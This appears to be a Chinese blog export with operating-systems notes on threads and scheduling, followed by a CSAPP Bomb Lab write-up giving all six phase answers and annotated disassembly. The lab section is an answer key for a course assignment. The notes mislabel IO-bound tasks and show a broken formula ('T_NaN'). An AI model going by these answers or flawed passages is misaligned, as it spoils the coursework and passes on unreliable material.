<h2 id="不同级别的线程"><a href="#不同级别的线程" class="headerlink" title="不同级别的线程"></a>不同级别的线程</h2><h3 id="User-level-Thread"><a href="#User-level-Thread" class="headerlink" title="User-level Thread"></a>User-level Thread</h3><p>用户级线程.</p>
<p>对于线程的控制, 资源的分配都是由进程自己掌控. </p>
<p>从内核角度, 系统只知进程, 感知不到其线程的存在.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/7.jpg" alt="线程模型6"></p>
<p>优点</p>
<ul>
<li>可以在不支持线程的OS上实现线程.<ul>
<li>OS管理进程表, 进程本身管理线程表</li>
<li>管理效率更高, 相比内核管理时更少的函数调用</li>
</ul>
</li>
<li>不同进程的线程调度算法可以采取不同策略</li>
<li>大大简化了内核的管理压力(需要管理的大量线程托付给进程管理了)</li>
</ul>
<p>缺点</p>
<ul>
<li>线程本身不能够调用阻塞的系统调用</li>
<li>进程内部没有时钟, 所以其他线程将无法运行, 直到该线程主动退出</li>
</ul>
<h3 id="Kernel-level-Thread"><a href="#Kernel-level-Thread" class="headerlink" title="Kernel-level Thread"></a>Kernel-level Thread</h3><p>内核级线程</p>
<p>线程还是属于进程, 但是线程的管理由OS负责.</p>
<p>OS 管理进程表与线程表.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/8.jpg" alt="待配图7"></p>
<p>优点</p>
<ul>
<li><p>内核管理全部的线程, 调度地更加灵活</p>
<p>指: A进程的A1线程阻塞后, OS可以切换至A2线程 或B进程中的B1线程</p>
<p><del>但是这不就是进程切换了吗哪儿是优点了啊喂</del>!</p>
</li>
<li><p>不需要新的非阻塞的系统调用</p>
</li>
</ul>
<h3 id="Hybrid-Thread"><a href="#Hybrid-Thread" class="headerlink" title="Hybrid Thread"></a>Hybrid Thread</h3><p>混合级线程</p>
<p>待配图</p>
<p>就是一部分用户级一部分内核级</p>
<p><del>其实我也没觉得好哪了</del></p>
<p>优点</p>
<ul>
<li>将用户级 内核级的优势相结合<ul>
<li>内核级的功能</li>
<li>用户级的性能</li>
</ul>
</li>
<li>避免不必要的用户-内核转换</li>
<li>Kernel assigns virtual processors to each process //存疑 没懂</li>
</ul>
<h3 id="Pop-up-Thread"><a href="#Pop-up-Thread" class="headerlink" title="Pop-up Thread"></a>Pop-up Thread</h3><p>弹出式线程</p>
<p>每当一个新消息(指外界请求)进入时, 进程弹出线程解决, 解决后销毁进程.</p>
<p>适用于类批处理任务, 如大型服务器回应用户请求.  作业小而多</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/10.jpg" alt="配图10"></p>
<p>优势</p>
<ul>
<li>线程即用即弃, 没有切换, 也无需保存历史数据</li>
</ul>
<h1 id="Scheduling"><a href="#Scheduling" class="headerlink" title="Scheduling"></a>Scheduling</h1><p>在本小节会涉及到：</p>
<ol>
<li>调度的概念<ol>
<li>CPU密集型与IO密集型作业</li>
<li>调度的目的</li>
<li>什么时候需要调度？</li>
<li>调度算法的目标（不同OS下目标有差异）</li>
</ol>
</li>
<li>不同系统下常见的调度算法<ol>
<li>批处理系统 (Batch SystemSs)<ol>
<li>First-come first-served        (FCFS,先来先服务)</li>
<li>Shortest job first             (SJF,短作业优先)</li>
<li>Shortest remaining time first (SRTF,最短剩余时间优先)</li>
</ol>
</li>
<li>交互式系统 (Interactive Systems)<ol>
<li>Round Robin                    (RR,时间片轮转)</li>
<li>Priority<ol>
<li>Statically Priority         (静态优先级)</li>
<li>Dynamically Priority        (动态优先级)</li>
</ol>
</li>
<li>Shortest Process Next          (SPN, 最短进程优先)</li>
<li>Others</li>
</ol>
</li>
<li>实时操作系统 (Real-Time Systems)<ol>
<li>可调度性</li>
</ol>
</li>
</ol>
</li>
<li>关于线程调度的一些补充</li>
</ol>
<p>需要说明的是，虽然进程调度与线程调度是两种东西，但算法的核心思想是一致的，这里不过分区分。</p>
<h2 id="调度的概念"><a href="#调度的概念" class="headerlink" title="调度的概念"></a>调度的概念</h2><h3 id="CPU密集型任务与IO密集型任务"><a href="#CPU密集型任务与IO密集型任务" class="headerlink" title="CPU密集型任务与IO密集型任务"></a>CPU密集型任务与IO密集型任务</h3><p>如果一个任务更多地需要CPU资源 (例如Matlab, 大量的运算) 我们称之为CPU密集型任务.</p>
<p>如果一个任务更多地需要IO资源 (例如Word的打印任务(外设), 读写任务(外存)) 我们称之为CPU密集型任务.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/QQ%E6%88%AA%E5%9B%BE20200608155404.jpg" alt="不同的任务种类"></p>
<h3 id="调度的目的"><a href="#调度的目的" class="headerlink" title="调度的目的"></a>调度的目的</h3><p>还是考虑单核CPU, 在多道程序(即多个进程”同时”工作) 的情况下, 会出现不同进程同时需要CPU的情况. 这时候CPU的资源就需要合理分配.</p>
<h3 id="什么时候需要调度"><a href="#什么时候需要调度" class="headerlink" title="什么时候需要调度?"></a>什么时候需要调度?</h3><ol>
<li>新进程的创建</li>
<li>进程的退出</li>
<li>某进程需要IO操作,</li>
<li>IO设备申请CPU中断 (称之为IO中断)</li>
</ol>
<h3 id="调度的几个原则"><a href="#调度的几个原则" class="headerlink" title="调度的几个原则"></a>调度的几个原则</h3><p>我们希望什么样的调度算法?</p>
<h4 id="All-System"><a href="#All-System" class="headerlink" title="All System"></a>All System</h4><ol>
<li><p>公平</p>
<p>公平, 公平. 还是tmd公平</p>
</li>
<li><p>强制</p>
<p>策略的调度必须被强制执行</p>
</li>
<li><p>平衡</p>
<p>能够使系统中的各部件都保持busy</p>
</li>
</ol>
<h4 id="批处理系统"><a href="#批处理系统" class="headerlink" title="批处理系统"></a>批处理系统</h4><ol>
<li><p>吞吐量</p>
<p>每小时工作数</p>
</li>
<li><p>周转时间 Turnaround time  ⭐</p>
<p>单次作业开始结束间的时间</p>
</li>
<li><p>CPU利用率</p>
<p>保持CPU始终忙碌</p>
</li>
</ol>
<h4 id="交互式系统"><a href="#交互式系统" class="headerlink" title="交互式系统"></a>交互式系统</h4><ol>
<li><p>响应时间</p>
<p>快速回应用户请求</p>
</li>
<li><p>均衡性</p>
<p>满足用户请求</p>
</li>
</ol>
<h4 id="实时系统"><a href="#实时系统" class="headerlink" title="实时系统"></a>实时系统</h4><ol>
<li><p>满足deadline</p>
<p>保证时效性</p>
</li>
<li><p>可预测性?</p>
</li>
</ol>
<h3 id="三级调度"><a href="#三级调度" class="headerlink" title="三级调度"></a>三级调度</h3><ol>
<li><p>long-term schedule（长期调度，又称作业调度)<br>哪个程序被系统选中并创建进程运行它</p>
</li>
<li><p>medium-term schedule（中期调度，又称内存调度)</p>
<p>决定是否将进程调入内存</p>
</li>
<li><p>short-term schedule（短期调度，又称CPU调度)</p>
<p>哪个进程获得处理器资源（通常所说的调度）</p>
</li>
</ol>
<h2 id="调度算法"><a href="#调度算法" class="headerlink" title="调度算法"></a>调度算法</h2><h3 id="评判算法优劣的标准"><a href="#评判算法优劣的标准" class="headerlink" title="评判算法优劣的标准"></a>评判算法优劣的标准</h3><p>假设你 10:00 进入银行, 等待了15分钟, 10:15~10:25办理业务, 这时业务员说需要等总部处理数据, 大概等待5分钟, 10:30~11:00办理了业务的剩下部分.然后离开银行</p>
<ol>
<li><p>Turnaround time  周转时间</p>
<p>the interval from submission to completion </p>
<p>从提交任务到完成任务. 例子中60min(10:00~11:00)</p>
</li>
<li><p>Waiting time 等待时间</p>
<p> amount of time a process has been waiting in the ready queue</p>
<p>在整个任务中你等待的时间 例子中15+10 = 25 min (10:00~10:15, 10:25~10:30)</p>
</li>
<li><p>Response time 响应时间</p>
<p> amount of time it takes from when a request was submitted until the first response is produced, not output </p>
<p>从任务提交到第一次被响应的时间 例子中15min (10:00~10:15)</p>
</li>
</ol>
<h3 id="批处理系统-1"><a href="#批处理系统-1" class="headerlink" title="批处理系统"></a>批处理系统</h3><h4 id="FCFS-First-come-first-served"><a href="#FCFS-First-come-first-served" class="headerlink" title="FCFS (First-come first-served )"></a>FCFS (First-come first-served )</h4><p>字面意思  不解释</p>
<p><strong>优势</strong>:</p>
<p>便于实现, 绝对平等</p>
<p><strong>缺点:</strong></p>
<p>低CPU利用率</p>
<h4 id="Shortest-Job-First-短作业优先"><a href="#Shortest-Job-First-短作业优先" class="headerlink" title="Shortest Job First (短作业优先)"></a>Shortest Job First (短作业优先)</h4><p><strong>优势:</strong></p>
<p>提高了CPU利用率</p>
<p><strong>劣势:</strong></p>
<p>对长作业不利</p>
<h4 id="Shortest-remaining-time-next-剩余时间最短优先"><a href="#Shortest-remaining-time-next-剩余时间最短优先" class="headerlink" title="Shortest remaining time next 剩余时间最短优先"></a>Shortest remaining time next 剩余时间最短优先</h4><h3 id="交互式系统-1"><a href="#交互式系统-1" class="headerlink" title="交互式系统"></a>交互式系统</h3><h4 id="Round-Robin-时间片轮转"><a href="#Round-Robin-时间片轮转" class="headerlink" title="Round Robin (时间片轮转)"></a>Round Robin (时间片轮转)</h4><ul>
<li>每个进程被分配时设置固定的时间轮片</li>
<li>时间片用完或进程结束, 发生调度</li>
</ul>
<p>时间片大小的设置</p>
<ul>
<li>过短, CPU将浪费大量时间在频繁的切换上</li>
<li>过长, 退化成FCFS算法</li>
</ul>
<h4 id="Priority-scheduling-优先级调度"><a href="#Priority-scheduling-优先级调度" class="headerlink" title="Priority scheduling (优先级调度)"></a>Priority scheduling (优先级调度)</h4><p>算法思想:</p>
<ol>
<li>优先调度优先级高的</li>
<li>又优先级相同时, 采用其他算法(如FCFS)</li>
</ol>
<p>优先级:</p>
<ul>
<li>静态优先级, 优先级被确立后不改变</li>
<li>动态优先级, 变化</li>
</ul>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/QQ%E6%88%AA%E5%9B%BE20200608155437.jpg" alt=""></p>
<h4 id="Shortest-process-next-最短进程"><a href="#Shortest-process-next-最短进程" class="headerlink" title="Shortest process next (最短进程)"></a>Shortest process next (最短进程)</h4><p>SJF算法更加适用于批处理系统, 因为每次的任务费时都是确定的.</p>
<p>Q : 对于交互式系统, 如何预估工作的用时?</p>
<p>⚠ 注意: 这里由于网页渲染的问题可能实际显示的公式不正确, 请自行查找其他资料.</p>
<p>A : 根据其过往表现估算</p>
<script type="math/tex; mode=display">
T_n = \alpha T_NaN + (1-\alpha)T_NaN</script><p>如果 <code>α = 1/2</code> ,那么预估时间为:</p>
<script type="math/tex; mode=display">
T_0,\\
\frac{T_0}{2}+\frac{T_1}{2},\\
\frac{T_0}{4}+\frac{T_1}{4}+\frac{T_2}{2},\\
\frac{T_0}{8}+\frac{T_1}{8}+\frac{T_2}{4}+\frac{T_3}{2}.</script><h4 id="其他调度算法"><a href="#其他调度算法" class="headerlink" title="其他调度算法"></a>其他调度算法</h4><ol>
<li><p>多级队列调度</p>
</li>
<li><p>确保(部分任务)调度</p>
</li>
<li><p>Lottery Scheduling </p>
<p>乐透调度, 彩票调度 随机</p>
</li>
<li><p>Fair-share Scheduling</p>
<p>考虑进程所属的用户</p>
</li>
</ol>
<h3 id="实时系统-1"><a href="#实时系统-1" class="headerlink" title="实时系统"></a>实时系统</h3><h4 id="系统的可调度性"><a href="#系统的可调度性" class="headerlink" title="系统的可调度性"></a><strong>系统的可调度性</strong></h4><p>假设某一时刻系统有 $m$ 个事件,每个事件 $i$ 需要在 $P_i$ 内完成,需要占据CPU的 $C_i$ 秒来实现<br>倘若满足</p>
<script type="math/tex; mode=display">
\qquad \sum^{m}_{i=1}\frac{C_i}{P_i}\leq1\\</script><p>称此时系统是可调度的 (Schedulable)</p>
<h2 id="关于线程调度的一些补充"><a href="#关于线程调度的一些补充" class="headerlink" title="关于线程调度的一些补充"></a>关于线程调度的一些补充</h2><p>用户级线程:</p>
<p>OS把时间片分配给进程, 进程再内部分配到每个线程.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/QQ%E6%88%AA%E5%9B%BE20200608155420.jpg" alt="用户线程调度"></p>
<p>系统级线程</p>
<p>OS直接把时间片分配到线程.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/QQ%E6%88%AA%E5%9B%BE20200608155427.jpg" alt="系统线程调度"></p>
<h2 id="关于调度的其他补充"><a href="#关于调度的其他补充" class="headerlink" title="关于调度的其他补充"></a>关于调度的其他补充</h2><ul>
<li><p>调度算法还有 抢占式/非抢占式(Preemptive/Non-Preemptive )之分</p>
</li>
<li><p>进程调度模块负责专业CPU控制权,包括:</p>
<ul>
<li>切换上下文</li>
<li>切换到用户态</li>
<li>跳转到程序适当位置并运行之</li>
</ul>
</li>
<li><p>算法的性能参数</p>
<ul>
<li><p>CPU利用率    (max)</p>
</li>
<li><p>Throughput  (min)</p>
<p>每个时间单元内进程完成的数目</p>
</li>
<li><p>周转时间  (min)</p>
<p>从本任务<strong>到达</strong>到本任务<strong>完成</strong>的总时间</p>
</li>
<li><p>等待时间  (min)</p>
</li>
<li><p>响应时间  (min)</p>
</li>
</ul>
</li>
</ul>
<hr>
<p><strong>操作系统系列</strong></p>
<ol>
<li>🔗<a href="https://luy-hb.xyz/2020/08/14/操作系统之概述/" target="_blank" rel="noopener">操作系统之概述</a></li>
<li>操作系统之进程线程 (本文)</li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/08/操作系统之进程间通信/" target="_blank" rel="noopener">操作系统之进程间通信</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/04/操作系统之死锁/" target="_blank" rel="noopener">操作系统之死锁</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/09/操作系统之内存管理/" target="_blank" rel="noopener">操作系统之内存管理</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/05/操作系统之IO管理/" target="_blank" rel="noopener">操作系统之IO管理</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/06/操作系统之文件系统/" target="_blank" rel="noopener">操作系统之文件系统</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/08/操作系统之多处理器系统/" target="_blank" rel="noopener">操作系统之多处理器系统</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/11/操作系统之安全/" target="_blank" rel="noopener">操作系统之安全</a></li>
</ol>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>专业课</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lab笔记2:Bomb</title>
    <url>/2020/07/01/CSAPP-Lab%E7%AC%94%E8%AE%B02-Bomb/</url>
    <content><![CDATA[<p>这是我在2020年6月26日~7月1日完成的Bomb Lab的题解与笔记</p>
<p>炸弹实验室是CS:APP 配套实验中的第二个实验, 通过对二进制文件反汇编来分析获得拆除炸弹的密码.</p>
<p>本文显式地包含答案, 如果你想自己解决,不建议使用本文.</p>
<p><a href="https://github.com/luy-0/CS-APP-LABs/tree/master/Lab-Answer_HB/Lab2-BombLab" target="_blank" rel="noopener">对应Github仓库 点我</a></p>
<a id="more"></a>
<h2 id="Catalog"><a href="#Catalog" class="headerlink" title="Catalog"></a>Catalog</h2><ol>
<li>GDB    包括GDB基本使用法, 但不全面</li>
<li>Bombs  包括各炸弹的题解与答案</li>
<li>Functions    包括各函数及其受调用函数的反汇编,及解释</li>
</ol>
<h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><h3 id="Breakpoints"><a href="#Breakpoints" class="headerlink" title="Breakpoints"></a>Breakpoints</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">break sum					进入sum()时断点</span><br><span class="line">break *0x80483c3 			在地址 0x80483c3 设置断点(注意&#96;\*号)</span><br></pre></td></tr></table></figure>
<h3 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stepi n						执行n条指令,缺省为1 会进入被调用函数</span><br><span class="line">nexti n						执行n条指令,缺省为1 不会进入被调用函数</span><br></pre></td></tr></table></figure>
<h3 id="Print"><a href="#Print" class="headerlink" title="Print"></a>Print</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print (char *) 0xbfff890   	Examine a string stored at 0xbffff890</span><br><span class="line"></span><br><span class="line">print  &#x2F;x $rip         		十六进制打印rip寄存器 (&#x2F;x可换为&#x2F;d或&#x2F;b)</span><br><span class="line"></span><br><span class="line">print *(int *) 0xbffff890 	Print integer at address 0xbffff890</span><br><span class="line"></span><br><span class="line">print *(int **) ($rsp+8)	Print address at address  ($rsp+8)</span><br></pre></td></tr></table></figure>
<h3 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> info registers     	Print all registers and their contents </span><br><span class="line"></span><br><span class="line">info breakpoints  		Print status of user-settable breakpoints</span><br></pre></td></tr></table></figure>
<h2 id="Bombs"><a href="#Bombs" class="headerlink" title="Bombs"></a>Bombs</h2><h3 id="Bomb1"><a href="#Bomb1" class="headerlink" title="Bomb1"></a>Bomb1</h3><p>炸弹1涉及到以下函数:</p>
<ol>
<li>Phase_1</li>
<li>strings_not_equal</li>
<li>string_length</li>
</ol>
<p>输入一个字符串, 它将与位于地址<code>0x402400</code>的字符串比较, 相符即可拆除.</p>
<p>因此答案为:</p>
<blockquote>
<p>Border relations with Canada have never been better.</p>
</blockquote>
<h3 id="Bomb2"><a href="#Bomb2" class="headerlink" title="Bomb2"></a>Bomb2</h3><p>炸弹2涉及到以下函数:</p>
<ol>
<li>Phase_2</li>
<li>read_six_numbers</li>
</ol>
<p>输入6个数字, 第一个是1, 剩下成公比为2的G.P. 即可拆除.</p>
<p>因此答案为:</p>
<blockquote>
<p>1 2 4 8 16 32</p>
</blockquote>
<h3 id="Bomb3"><a href="#Bomb3" class="headerlink" title="Bomb3"></a>Bomb3</h3><p>炸弹3涉及到以下函数:</p>
<ol>
<li>phase_3</li>
<li>__isoc99_sscanf</li>
</ol>
<p>输入两个数字, 这两个数字必须是以下8组之一:</p>
<ul>
<li>0    207</li>
<li>1    311</li>
<li>2    707</li>
<li>3    256</li>
<li>4    389</li>
<li>5    206</li>
<li>6    682</li>
<li>7    327</li>
</ul>
<p>例如,答案可以输入:</p>
<blockquote>
<p>2   707</p>
</blockquote>
<p>答案不唯一</p>
<h3 id="Bomb4"><a href="#Bomb4" class="headerlink" title="Bomb4"></a>Bomb4</h3><p>这个递归炸弹真把我整🤮了… 每一条汇编指令都能看懂在干什么, 合在一起就傻了, 连猜带蒙把答案鼓捣出来了…</p>
<p>我讨厌递归😭</p>
<p>PS: 后来用反汇编解决了</p>
<p>炸弹4涉及到以下函数:</p>
<ol>
<li>phase_4</li>
<li>func4</li>
</ol>
<p>输入两个数字, 数字1必须为 <code>{0,1,3,7}</code> 中任一个, 数字2必须为 <code>0</code>.</p>
<p>例如, 答案可以输入:</p>
<blockquote>
<p>3  0</p>
</blockquote>
<p>答案不唯一</p>
<h3 id="Bomb-5"><a href="#Bomb-5" class="headerlink" title="Bomb 5"></a>Bomb 5</h3><p>相对不难的映射炸弹, 将输入的字符进行运算映射到特定地址, 并根据这些地址中取出的字符判断是否爆炸.</p>
<p>炸弹5涉及到以下函数:</p>
<ol>
<li>phase_5</li>
<li>strings_not_equal</li>
<li>string_length</li>
</ol>
<p>输入长度为6的字符串, 每个字符都要符合以下条件:</p>
<ol>
<li>第一个字符的ASCII码必须是<code>0x?9</code></li>
<li>第二个字符的ASCII码必须是<code>0x?f</code></li>
<li>第三个字符的ASCII码必须是<code>0x?e</code></li>
<li>第四个字符的ASCII码必须是<code>0x?5</code></li>
<li>第五个字符的ASCII码必须是<code>0x?6</code></li>
<li>第六个字符的ASCII码必须是<code>0x?7</code></li>
</ol>
<p>其中,<code>?</code>表示任意数字, 例如:</p>
<ol>
<li><p><code>?</code>全部取4 . 应输入的字符串为:</p>
<blockquote>
<p>IONEFG</p>
</blockquote>
</li>
<li><p><code>?</code>全部取3 . 应输入的字符串为:</p>
<blockquote>
<p>9?&gt;567</p>
</blockquote>
</li>
<li><p><code>?</code>也不一定只取同一个值, 例如第12,34,56字符的<code>?</code>值分别取3,4,6. 应输入的字符串为:</p>
<blockquote>
<p>9?NEfg</p>
</blockquote>
</li>
</ol>
<p>上述字符串均可作为答案, 答案不唯一.</p>
<h3 id="Bomb-6"><a href="#Bomb-6" class="headerlink" title="Bomb 6"></a>Bomb 6</h3><p>比较烦的循环炸弹, 一共涉及到了6个循环(还包括一个嵌套循环) ,一点点捋开就好了.要求输入六个不同数字, 每个数字都必须在1-6之间,并且数字需要按照固定顺序</p>
<p>炸弹6涉及以下函数:</p>
<ol>
<li>phase_6</li>
<li>read_six_numbers</li>
</ol>
<p>输入的每个数字最后都会映射到一个三位数上, 要求被映射顺序必须使由大到小, 因此输入的数字必须按照固定顺序. </p>
<p>答案:</p>
<blockquote>
<p>4,3,2,1,6,5</p>
</blockquote>
<h2 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h2><h3 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *input;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 读入数据 */</span></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>) &#123;  </span><br><span class="line">		infile = <span class="built_in">stdin</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (argc == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(infile = fopen(argv[<span class="number">1</span>], <span class="string">"r"</span>))) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: Error: Couldn't open %s\n"</span>, argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: %s [&lt;input_file&gt;]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 开始炸弹 */</span></span><br><span class="line">    initialize_bomb();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to my fiendish little bomb. You have 6 phases with\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"which to blow yourself up. Have a nice day!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bomb1 */</span></span><br><span class="line">    input = read_line();          </span><br><span class="line">    phase_1(input);               </span><br><span class="line">    phase_defused();                 </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Phase 1 defused. How about the next one?\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bomb2 */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_2(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"That's number 2.  Keep going!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bomb3 */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_3(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Halfway there!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bomb4 */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_4(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"So you got that one.  Try this one.\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Bomb5 */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_5(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Good work!  On to the next...\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bomb6 */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_6(input);</span><br><span class="line">    phase_defused();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 结束 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase_1"></a>Phase_1</h3><ul>
<li>输入: 一个字符指针 input</li>
<li>功能: input 指向对象与 地址<code>$0x402400</code>指向对象相同,不同炸</li>
<li>调用: strings_not_equal();  </li>
<li>返回: 0</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_1:</span><br><span class="line">&#x2F;&#x2F;rdi &#x3D; *input</span><br><span class="line">    0x0000000000400ee0 &lt;+0&gt;:	sub    $0x8,%rsp        &#x2F;&#x2F;栈下调8位</span><br><span class="line">    0x0000000000400ee4 &lt;+4&gt;:	mov    $0x402400,%esi   &#x2F;&#x2F;$0x402400 放入%esi(参数2)</span><br><span class="line">    0x0000000000400ee9 &lt;+9&gt;:	callq  0x401338 &lt;strings_not_equal&gt; &#x2F;&#x2F;调用strings_not_equal</span><br><span class="line">    0x0000000000400eee &lt;+14&gt;:	test   %eax,%eax       &#x2F;&#x2F;检测参1参2是否相同</span><br><span class="line">    0x0000000000400ef0 &lt;+16&gt;:	je     0x400ef7 &lt;phase_1+23&gt;    &#x2F;&#x2F;0相同 转+23</span><br><span class="line">    0x0000000000400ef2 &lt;+18&gt;:	callq  0x40143a &lt;explode_bomb&gt;  &#x2F;&#x2F;1不同,炸</span><br><span class="line">    0x0000000000400ef7 &lt;+23&gt;:	add    $0x8,%rsp    &#x2F;&#x2F;出栈</span><br><span class="line">    0x0000000000400efb &lt;+27&gt;:	retq</span><br></pre></td></tr></table></figure>
<h3 id="strings-not-equal"><a href="#strings-not-equal" class="headerlink" title="strings_not_equal"></a>strings_not_equal</h3><ul>
<li>输入: 参数12 均为字符地址</li>
<li>功能: 比较两个指向对象长度与内容是否相同</li>
<li>调用: string_length()</li>
<li>返回: 相同返回0, 不同返回1</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function strings_not_equal:</span><br><span class="line">&#x2F;* rdi &#x3D; *input; esi &#x3D; $0x402400</span><br><span class="line">    0x0000000000401338 &lt;+0&gt;:	push   %r12</span><br><span class="line">    0x000000000040133a &lt;+2&gt;:	push   %rbp</span><br><span class="line">    0x000000000040133b &lt;+3&gt;:	push   %rbx     &#x2F;&#x2F;以上保存环境</span><br><span class="line">    0x000000000040133c &lt;+4&gt;:	mov    %rdi,%rbx    &#x2F;&#x2F;rbx &#x3D; *input</span><br><span class="line">    0x000000000040133f &lt;+7&gt;:	mov    %rsi,%rbp    &#x2F;&#x2F;rbp &#x3D; $0x402400(地址)</span><br><span class="line">    0x0000000000401342 &lt;+10&gt;:	callq  0x40131b &lt;string_length&gt; &#x2F;&#x2F;调用string_length, 参数不变</span><br><span class="line">    0x0000000000401347 &lt;+15&gt;:	mov    %eax,%r12d   &#x2F;&#x2F;r12d(双字)保存字符串长度</span><br><span class="line">    0x000000000040134a &lt;+18&gt;:	mov    %rbp,%rdi    &#x2F;&#x2F;计算($0x402400)的长度</span><br><span class="line">    0x000000000040134d &lt;+21&gt;:	callq  0x40131b &lt;string_length&gt; &#x2F;&#x2F;($0x402400)长度保存在rax</span><br><span class="line">    0x0000000000401352 &lt;+26&gt;:	mov    $0x1,%edx    &#x2F;&#x2F;edx &#x3D; 1</span><br><span class="line">    0x0000000000401357 &lt;+31&gt;:	cmp    %eax,%r12d   &#x2F;&#x2F;字符串与常数长度比较</span><br><span class="line">    0x000000000040135a &lt;+34&gt;:	jne    0x40139b &lt;strings_not_equal+99&gt;  &#x2F;&#x2F;长度不同转99</span><br><span class="line">    0x000000000040135c &lt;+36&gt;:	movzbl (%rbx),%eax  &#x2F;&#x2F;串1 -&gt; rax</span><br><span class="line">    0x000000000040135f &lt;+39&gt;:	test   %al,%al</span><br><span class="line">    0x0000000000401361 &lt;+41&gt;:	je     0x401388 &lt;strings_not_equal+80&gt;&#x2F;&#x2F;如果串1空,转80</span><br><span class="line">    0x0000000000401363 &lt;+43&gt;:	cmp    0x0(%rbp),%al        &#x2F;&#x2F;比较串1串2</span><br><span class="line">    0x0000000000401366 &lt;+46&gt;:	je     0x401372 &lt;strings_not_equal+58&gt;  &#x2F;&#x2F;相等,转58</span><br><span class="line">    0x0000000000401368 &lt;+48&gt;:	jmp    0x40138f &lt;strings_not_equal+87&gt;  &#x2F;&#x2F;不等,转87</span><br><span class="line">    0x000000000040136a &lt;+50&gt;:	cmp    0x0(%rbp),%al    &#x2F;&#x2F;比较(常数)与字符串</span><br><span class="line">    0x000000000040136d &lt;+53&gt;:	nopl   (%rax)       &#x2F;&#x2F;好像是对齐用的? 无操作</span><br><span class="line">    0x0000000000401370 &lt;+56&gt;:	jne    0x401396 &lt;strings_not_equal+94&gt;  &#x2F;&#x2F;不等转94</span><br><span class="line">    0x0000000000401372 &lt;+58&gt;:	add    $0x1,%rbx    &#x2F;&#x2F;字符串指针++</span><br><span class="line">    0x0000000000401376 &lt;+62&gt;:	add    $0x1,%rbp    